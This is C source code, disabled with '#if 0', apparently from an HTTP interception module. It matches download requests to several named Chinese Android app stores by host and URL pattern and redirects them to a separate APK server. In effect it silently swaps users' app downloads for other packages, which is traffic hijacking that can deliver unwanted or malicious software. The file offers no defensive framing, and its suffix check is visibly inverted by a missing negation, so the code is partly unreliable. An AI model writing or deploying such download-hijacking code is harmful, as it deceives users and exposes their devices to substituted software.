#if 0
#include <string.h>

#include "list.h"

#include "ha_policy.h"
#include "ha_misc.h"
#include "ha_debug.h"

struct ha_spec_entry {
	/*host*/
	struct list_head next;
	bool (*checker)(struct ha_http_request *);
	struct ha_string_entry host;
};

struct ha_spec_ctl{
	struct list_head head;
};

static struct ha_spec_ctl hs_ctl;

static bool urlpre_check(struct  ha_http_request *req,const char *urlpre,uint len)
{
	return (req->url.len >= len && !memcmp(req->url.str,urlpre,len));	
}
static bool urlpost_check(struct  ha_http_request *req,const char *urlpost,uint len)
{
	return req->url.len >= len && memcmp(req->url.str + req->url.len - len,urlpost,len);
}
static bool jiuyou_checker( struct ha_http_request *req)
{
	return  urlpre_check(req,"/game/down",10) && urlpost_check(req,".html",5);
}

static bool yyh_checker(struct ha_http_request *req)
{
	return urlpre_check(req,"/McDonald/e/",12);	
}

static bool youyi_checker(struct ha_http_request *req)
{
	return urlpre_check(req,"/download/",10);
}

static bool mmy_checker(struct ha_http_request *req)
{
	if (req->url.len < 2)
		return false;

	uint i;
	for (i = 1 ; i < req->url.len ; i++)
		if (!isdigit(req->url.str[i]))
			return false;

	return true;
}

static bool mbg_checker(struct ha_http_request *req)
{
	return urlpre_check(req,"/dede/appload.php?",18);
}


static struct ha_spec_entry spec_table[] = {
	{.checker = jiuyou_checker,	.host = {.content = {"9game.cn",8}}},
	{.checker = yyh_checker,	.host = {.content = {"mobile.d.appchina.com",21}}},
	{.checker = youyi_checker,	.host = {.content = {".eoemarket.com",14}}},
	{.checker = mmy_checker,	.host = {.content = {"down.mumayi.com",15}}},
	{.checker = mbg_checker,	.host = {.content = {"www.guopan.cn",13}}},
	{.checker = NULL,			.host = {.content = {NULL,0}}}
};

extern  char *ha_apk_server(void);
extern  char *ha_apk_path(void);

static bool ha_spec_check(struct ha_http_request *req,struct ha_packet_info *pi)
{
	struct ha_spec_ctl *ctl = &hs_ctl;
	bool hit = false;
	struct ha_spec_entry *pos;
	list_for_each_entry(pos,&ctl->head,next) {
		if (ha_string_suffix_cmp(&pos->host,req->host)) {
			hit =  pos->checker(req);
			break;
		}
	}

	if (!hit)
		return false;

	if (!ha_build_redir_args(req,req->ua,"apk",pi,false))
		return false;

	ha_http_redirect(pi,"http",ha_apk_server(),ha_apk_path(),ha_escap_buffer_get(),1);
	return true;
}

void ha_spec_init(void)
{
	struct ha_spec_ctl *ctl = &hs_ctl;
	INIT_LIST_HEAD(&ctl->head);

	struct ha_spec_entry *e = spec_table;
	while (e->checker) {
		list_add_tail(&e->next,&ctl->head);
		e++;
	}
	
	ha_policy_spec_register(ha_spec_check);
}

void ha_spec_destroy(void)
{

}

#endif
